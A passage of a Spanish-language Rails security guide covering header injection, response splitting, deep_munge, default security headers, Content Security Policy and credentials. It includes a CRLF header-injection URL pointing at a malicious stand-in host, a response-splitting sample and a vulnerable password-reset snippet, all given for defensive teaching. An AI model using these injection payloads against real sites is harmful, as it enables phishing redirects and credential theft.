http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
</code></pre>
</div>
<p>Tenga en cuenta que <code>%0d%0a</code> está codificado en URL para <code>\r\n</code>, que es un retorno de carro y un avance de línea (CRLF) en Ruby. Entonces, el encabezado HTTP resultante para el segundo ejemplo será el siguiente porque el segundo campo de encabezado de Ubicación sobrescribe al primero.</p><div class="code_container">
<pre><code class="language-plain">HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
</code></pre>
</div>
<p>Entonces, <em>los vectores de ataque para la inyección de encabezado se basan en la inyección de caracteres CRLF en un campo de encabezado.</em> ¿Y qué podría hacer un atacante con una redirección falsa? Podrían redirigir a un sitio de phishing que tiene el mismo aspecto que el suyo, pero pedirán volver a iniciar sesión (y enviarán las credenciales de inicio de sesión al atacante). O podrían instalar software malicioso a través de los agujeros de seguridad del navegador en ese sitio. Rails 2.1.2 escapa estos caracteres para el campo Ubicación en el método <code>redirect_to</code>. <em>Asegúrese de hacerlo usted mismo cuando cree otros campos de encabezado con la entrada del usuario.</em></p><h5 id="response-splitting"><a class="anchorlink" href="#response-splitting">7.8.1 Response Splitting</a></h5><p>Si la inyección de encabezado fuera posible, la división de respuesta también podría serlo. En HTTP, el bloque de encabezado va seguido de dos CRLF y los datos reales (generalmente HTML). La idea de la división de respuestas es inyectar dos CRLF en un campo de encabezado, seguido de otra respuesta con HTML malicioso. La respuesta será:</p><div class="code_container">
<pre><code class="language-plain">HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
</code></pre>
</div>
<p>En determinadas circunstancias, esto presentaría el HTML malicioso a la víctima. Sin embargo, esto solo parece funcionar con las conexiones Keep-Alive (y muchos navegadores usan conexiones únicas). Pero no puedes confiar en esto. <em>En cualquier caso, se trata de un error grave, y debería actualizar sus Rails a la versión 2.0.5 o 2.1.2 para eliminar los riesgos de la inyección de encabezado (y por lo tanto la división de respuestas) .</em></p><h3 id="unsafe-query-generation"><a class="anchorlink" href="#unsafe-query-generation">8 Unsafe Query Generation</a></h3><p>Debido a la forma en que Active Record interpreta los parámetros en combinación con la forma
que Rack analiza los parámetros de consulta fue posible emitir una base de datos inesperada
consultas con cláusulas where <code>IS NULL</code>. Como respuesta a ese problema de seguridad
(<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ">CVE-2012-2660</a>,
<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ">CVE-2012-2694</a>
and <a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ">CVE-2013-0155</a>)
<code>deep_munge</code> el método se introdujo como una solución para mantener Rails seguro de forma predeterminada.</p><p>Ejemplo de código vulnerable que podría ser utilizado por el atacante, si <code>deep_munge</code>
no se realizó es:</p><div class="code_container">
<pre><code class="language-ruby">unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
</code></pre>
</div>
<p>Cuando <code>params [: token]</code> es uno de: <code>[nil]</code>, <code>[nil, nil, ...]</code> o
<code>['foo', nil]</code> omitirá la prueba para <code>nil</code>, pero<code>IS NULL</code> o
<code>IN ('foo', NULL)</code> donde todavía se agregarán cláusulas a la consulta SQL.</p><p>Para mantener Rails seguro por defecto, <code>deep_munge</code> reemplaza algunos de los valores con
<code>nil</code>. La siguiente tabla muestra cómo se ven los parámetros según el <code>JSON</code> enviado
solicitud:</p>
<table>
<thead>
<tr>
<th>JSON</th>
<th>Parameters</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>{ "person": null }</code></td>
<td><code>{ :person =&gt; nil }</code></td>
</tr>
<tr>
<td><code>{ "person": [] }</code></td>
<td><code>{ :person =&gt; [] }</code></td>
</tr>
<tr>
<td><code>{ "person": [null] }</code></td>
<td><code>{ :person =&gt; [] }</code></td>
</tr>
<tr>
<td><code>{ "person": [null, null, ...] }</code></td>
<td><code>{ :person =&gt; [] }</code></td>
</tr>
<tr>
<td><code>{ "person": ["foo", null] }</code></td>
<td><code>{ :person =&gt; ["foo"] }</code></td>
</tr>
</tbody>
</table>
<p>Es posible volver al comportamiento anterior y deshabilitar la configuración de <code>deep_munge</code>
su aplicación si es consciente del riesgo y sabe cómo manejarlo:</p><div class="code_container">
<pre><code class="language-ruby">config.action_dispatch.perform_deep_munge = false
</code></pre>
</div>
<h3 id="default-headers"><a class="anchorlink" href="#default-headers">9 Default Headers</a></h3><p>Cada respuesta HTTP de su aplicación Rails recibe los siguientes encabezados de seguridad predeterminados.</p><div class="code_container">
<pre><code class="language-ruby">config.action_dispatch.default_headers = {
  'X-Frame-Options' =&gt; 'SAMEORIGIN',
  'X-XSS-Protection' =&gt; '1; mode=block',
  'X-Content-Type-Options' =&gt; 'nosniff',
  'X-Download-Options' =&gt; 'noopen',
  'X-Permitted-Cross-Domain-Policies' =&gt; 'none',
  'Referrer-Policy' =&gt; 'strict-origin-when-cross-origin'
}
</code></pre>
</div>
<p>Puede configurar encabezados predeterminados en <code>config/application.rb</code>.</p><div class="code_container">
<pre><code class="language-ruby">config.action_dispatch.default_headers = {
  'Header-Name' =&gt; 'Header-Value',
  'X-Frame-Options' =&gt; 'DENY'
}
</code></pre>
</div>
<p>O puedes eliminarlos.</p><div class="code_container">
<pre><code class="language-ruby">config.action_dispatch.default_headers.clear
</code></pre>
</div>
<p>Aquí hay una lista de encabezados comunes:</p>
<ul>
<li>
<strong>X-Frame-Options:</strong> <em><code>SAMEORIGIN</code> in Rails by default</em> - Permitir enmarcar en el mismo dominio. Configúrelo en 'DENY' para denegar el encuadre o elimine este encabezado por completo si desea permitir el encuadre en todos los sitios web.</li>
<li>
<strong>X-XSS-Protection:</strong> <em><code>1; mode=block</code> in Rails by default</em> - use XSS Auditor y bloquee la página si se detecta un ataque XSS. Póngalo en '0;' si desea desactivar XSS Auditor (útil si la respuesta contiene scripts de parámetros de solicitud)</li>
<li>
<strong>X-Content-Type-Options:</strong> <em><code>nosniff</code> in Rails by default</em> - evita que el navegador adivine el tipo MIME de un archivo.</li>
<li>
<strong>X-Content-Security-Policy:</strong> <a href="http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html">A powerful mechanism for controlling which sites certain content types can be loaded from</a>
</li>
<li>
<strong>Access-Control-Allow-Origin:</strong> Se utiliza para controlar qué sitios pueden omitir las mismas políticas de origen y enviar solicitudes de origen cruzado.</li>
<li>
<strong>Strict-Transport-Security:</strong> <a href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">Used to control if the browser is allowed to only access a site over a secure connection</a>
</li>
</ul>
<h4 id="content-security-policy"><a class="anchorlink" href="#content-security-policy">9.1 Content Security Policy</a></h4><p>Rails proporciona un DSL que le permite configurar un
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a>
para su aplicación. Puede configurar una política predeterminada global y luego
anularlo por recurso e incluso usar lambdas para inyectar por solicitud
valores en el encabezado, como subdominios de cuenta en una aplicación de múltiples inquilinos.</p><p>Ejemplo de política global:</p><div class="code_container">
<pre><code class="language-ruby"># config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https

  # Specify URI for violation reports
  policy.report_uri "/csp-violation-report-endpoint"
end
</code></pre>
</div>
<p>Ejemplo de anulaciones del controlador:</p><div class="code_container">
<pre><code class="language-ruby"># Override policy inline
class PostsController &lt; ApplicationController
  content_security_policy do |p|
    p.upgrade_insecure_requests true
  end
end

# Using literal values
class PostsController &lt; ApplicationController
  content_security_policy do |p|
    p.base_uri "https://www.example.com"
  end
end

# Using mixed static and dynamic values
class PostsController &lt; ApplicationController
  content_security_policy do |p|
    p.base_uri :self, -&gt; { "https://#{current_user.domain}.example.com" }
  end
end

# Disabling the global CSP
class LegacyPagesController &lt; ApplicationController
  content_security_policy false, only: :index
end
</code></pre>
</div>
<p>Utilice el <code>content_security_policy_report_only</code>
atributo de configuración para establecer
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only">Content-Security-Policy-Report-Only</a>
para informar solo infracciones de contenido para la migración
contenido heredado</p><div class="code_container">
<pre><code class="language-ruby"># config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy_report_only = true
</code></pre>
</div>
<div class="code_container">
<pre><code class="language-ruby"># Controller override
class PostsController &lt; ApplicationController
  content_security_policy_report_only only: :index
end
</code></pre>
</div>
<p>Puede habilitar la generación automática de nonce:</p><div class="code_container">
<pre><code class="language-ruby"># config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -&gt; request { SecureRandom.base64(16) }
</code></pre>
</div>
<p>Luego puede agregar un valor de nonce automático pasando <code>nonce: true</code>
como parte de <code>html_options</code>. Ejemplo:</p><div class="code_container">
<pre><code class="language-erb">&lt;%= javascript_tag nonce: true do -%&gt;
  alert('Hello, World!');
&lt;% end -%&gt;
</code></pre>
</div>
<p>Lo mismo funciona con <code>javascript_include_tag</code>:</p><div class="code_container">
<pre><code class="language-erb">&lt;%= javascript_include_tag "script", nonce: true %&gt;
</code></pre>
</div>
<p>Utilice <a href="https://edgeapi.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag"><code>csp_meta_tag</code></a>
ayudante para crear una metaetiqueta "csp-nonce" con el valor nonce por sesión
para permitir etiquetas <code>&lt;script&gt;</code> en línea.</p><div class="code_container">
<pre><code class="language-erb">&lt;head&gt;
  &lt;%= csp_meta_tag %&gt;
&lt;/head&gt;
</code></pre>
</div>
<p>Esto lo utiliza el ayudante de Rails UJS para crear dinámicamente
elementos <code>&lt;script&gt;</code> en línea cargados.</p><h3 id="environmental-security"><a class="anchorlink" href="#environmental-security">10 Environmental Security</a></h3><p>Está fuera del alcance de esta guía informarle sobre cómo proteger el código y los entornos de su aplicación. Sin embargo, asegure la configuración de su base de datos, p. Ej. <code>config / database.yml</code>, clave maestra para<code>credentials.yml</code> y otros secretos no cifrados. Es posible que desee restringir aún más el acceso, utilizando versiones específicas del entorno de estos archivos y cualquier otro que pueda contener información confidencial.</p><h4 id="custom-credentials"><a class="anchorlink" href="#custom-credentials">10.1 Custom Credentials</a></h4><p>Rails almacena secretos en <code>config/credentials.yml.enc</code>, que está encriptado y, por lo tanto, no se puede editar directamente. Rails usa <code>config/master.key</code> o alternativamente busca la variable de entorno <code>ENV["RAILS_MASTER_KEY"]</code>para cifrar el archivo de credenciales. El archivo de credenciales se puede almacenar en el control de versiones, siempre que la clave maestra se mantenga segura.</p><p>Para agregar un nuevo secreto a las credenciales, primero ejecute <code>bin/rails secret</code> para obtener un nuevo secreto. Luego ejecute <code>bin/rails credentials:edit</code> para editar las credenciales y agregue el secreto. La ejecución de <code>credentials:edit</code> crea un nuevo archivo de credenciales y una clave maestra, si aún no existían.</p><p>De forma predeterminada, este archivo contiene los
<code>secret_key_base</code>, pero también podría usarse para almacenar otras credenciales, como claves de acceso para API externas.</p><p>Los secretos guardados en el archivo de credenciales son accesibles a través de <code>Rails.application.credentials</code>.
Por ejemplo, con el siguiente <code>config/credentials.yml.enc</code> descifrado:</p><div class="code_container">
<pre><code class="language-yaml">secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
some_api_key: SOMEKEY
</code></pre>
</div>
<p><code>Rails.application.credentials.some_api_key</code> devuelve <code>SOMEKEY"</code> en cualquier entorno. </p><p>Si desea que se genere una excepción cuando alguna clave está en blanco, use el bang
versión:</p><div class="code_container">
<pre><code class="language-ruby">Rails.application.credentials.some_api_key! # =&gt; raises KeyError: :some_api_key is blank
</code></pre>
</div>
<div class="info"><p>Obtenga más información sobre las credenciales con <code>bin/rails credentials: help</code>.</p></div><div class="warning"><p>Mantenga su llave maestra segura. No confíe su clave maestra.</p></div><h3 id="dependency-management-and-cves"><a class="anchorlink" href="#dependency-management-and-cves">11 Dependency Management and CVEs</a></h3><p>No modificamos las dependencias solo para fomentar el uso de nuevas versiones, incluso para problemas de seguridad. Esto se debe a que los propietarios de aplicaciones necesitan actualizar manualmente sus gemas independientemente de nuestros esfuerzos. Utilice <code>bundle update --conservative gem_name</code> para actualizar de forma segura las dependencias vulnerables.</p><h3 id="additional-resources"><a class="anchorlink" href="#additional-resources">12 Additional Resources</a></h3><p>El panorama de la seguridad cambia y es importante mantenerse actualizado, porque perder una nueva vulnerabilidad puede ser catastrófico. Puede encontrar recursos adicionales sobre la seguridad de (Rails) aquí:</p>
<ul>
<li>Suscríbase a la lista de correo de seguridad Rails <a href="https://groups.google.com/forum/#!forum/rubyonrails-security">mailing list</a>.</li>
<li>
<a href="https://brakemanscanner.org/">Brakeman - Rails Security Scanner</a> - ara realizar análisis de seguridad estática para aplicaciones Rails.</li>
<li>
<a href="http://secunia.com/">Keep up to date on the other application layers</a> (también tienen un boletín semanal).</li>
<li>A <a href="https://www.owasp.org">good security blog</a> que incluye la <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">Cross-Site scripting Cheat Sheet</a>.</li>
</ul>


        <h3>Comentarios Sobre el Contenido</h3>
        <p>
          Las guías de rieles se administran y publican en latinadeveloper/railsguides.es en GitHub.
        </p>
        <p>
          Si lee esta guía y encuentra algún texto o código incorrecto que le interese, no dude en enviar una solicitud de extracción en el repositorio anterior.

          Consulte el archivo README en GitHub para saber cómo enviar una solicitud de extracción.
          Please contribute if you see any typos or factual errors.
        </p>

      </div>
    </div>
  </div>

  <hr class="hide" />
  <div id="footer">
    <div class="wrapper">
      <p>This work is licensed under a <a href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International</a> License</p>
<p>"Rails", "Ruby on Rails", and the Rails logo are trademarks of David Heinemeier Hansson. All rights reserved.</p>

    </div>
  </div>
</body>
</html>
